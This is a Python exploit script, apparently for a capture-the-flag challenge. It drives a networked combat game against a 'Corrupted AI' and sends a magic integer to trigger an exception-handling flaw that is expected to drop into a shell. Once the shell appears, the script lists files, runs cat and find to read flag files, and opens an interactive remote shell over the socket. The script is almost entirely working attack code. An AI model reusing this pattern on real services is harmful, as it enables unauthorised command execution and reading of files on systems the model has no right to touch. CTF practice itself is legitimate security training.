#!/usr/bin/env python3
"""
Theory: Cast special skill during combat to throw exception,
then the exception carries over to wish_ultimate_power() catch block.
"""

import socket
import time
import sys

HOST = sys.argv[1] if len(sys.argv) >= 2 else "192.168.100.121"
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 40021

print(f"[*] Connecting to {HOST}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((HOST, PORT))

# Setup
s.recv(4096)
s.sendall(b"ExceptionTest\n")
print("[+] Sent player name")
time.sleep(0.2)
s.recv(4096)

print("[*] Strategy: Attack until AI is low HP, then cast special skill")

turn_count = 0
used_special_skill = False

while turn_count < 30:
    turn_count += 1

    try:
        data = s.recv(4096, socket.MSG_DONTWAIT)
        text = data.decode("utf-8", errors="ignore")
        print(f"[Turn {turn_count}] Received: {text[:100]}...")

        # Check if we won
        if "You have defeated the Corrupted AI" in text:
            print(f"\n[SUCCESS] AI defeated!")
            break

        # Check AI HP
        if "Corrupted AI HP:" in text and not used_special_skill:
            import re

            match = re.search(r"Corrupted AI HP: (\d+)", text)
            if match:
                ai_hp = int(match.group(1))
                print(f"[INFO] AI HP: {ai_hp}")

                # When AI is low, try special skill with magic value
                if ai_hp <= 30:
                    print("\n[*] AI HP low! Using Special Skill (option 3)")
                    s.sendall(b"3\n")
                    time.sleep(0.3)

                    skill_response = s.recv(4096)
                    print(
                        f"[SKILL PROMPT] {skill_response.decode('utf-8', errors='ignore')}"
                    )

                    # Send the 32-bit magic solution
                    print("[*] Sending magic value: 2863311539 (0xaaaaaaab)")
                    s.sendall(b"2863311539\n")
                    time.sleep(0.5)

                    result = s.recv(4096)
                    result_text = result.decode("utf-8", errors="ignore")
                    print(f"[RESULT]\n{result_text}")

                    used_special_skill = True

                    if "Overload" in result_text or "exception" in result_text.lower():
                        print("\n[!!!] EXCEPTION DETECTED! Now finishing the game...")

                    continue
    except socket.error:
        pass

    # Normal attack pattern
    if turn_count % 4 == 0:
        s.sendall(b"4\n")  # Heal
        print(f"[Turn {turn_count}] Healing")
    else:
        s.sendall(b"1\n")  # Attack
        print(f"[Turn {turn_count}] Attacking")

    time.sleep(0.3)

# Make sure we finish the game
print("\n[*] Finishing combat if needed...")
for _ in range(5):
    try:
        data = s.recv(4096, socket.MSG_DONTWAIT)
        if b"defeated the Corrupted AI" in data:
            print("[+] Combat finished!")
            break
    except:
        s.sendall(b"1\n")
        time.sleep(0.3)

print("\n[*] Choosing wish option 2 (Ultimate Power)")
print("[*] If exception is pending, it should trigger the catch block now!")
s.sendall(b"2\n")
time.sleep(1)

result = s.recv(4096)
result_text = result.decode("utf-8", errors="ignore")

print("=" * 70)
print(result_text)
print("=" * 70)

if "debug" in result_text.lower() or "sh" in result_text.lower() or "$" in result_text:
    print("\n[SUCCESS!!!] Shell detected!")

    # Try to get flag
    s.sendall(b"ls -la\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

    s.sendall(
        b"cat flag* 2>/dev/null || cat ../flag* 2>/dev/null || find . -name '*flag*' 2>/dev/null\n"
    )
    time.sleep(0.5)
    flag_output = s.recv(4096).decode("utf-8", errors="ignore")
    print(f"\n[FLAG OUTPUT]\n{flag_output}")

    if "CSC" in flag_output or "flag{" in flag_output:
        print("\n[+] FLAG CAPTURED!")

    print("\n[*] Interactive shell:")
    try:
        while True:
            cmd = input("$ ")
            if cmd.strip():
                s.sendall(cmd.encode() + b"\n")
                time.sleep(0.5)
                print(s.recv(4096).decode("utf-8", errors="ignore"))
    except KeyboardInterrupt:
        print("\n[*] Exiting")
else:
    print("\n[WARN] No shell yet. Theory might be wrong.")

s.close()
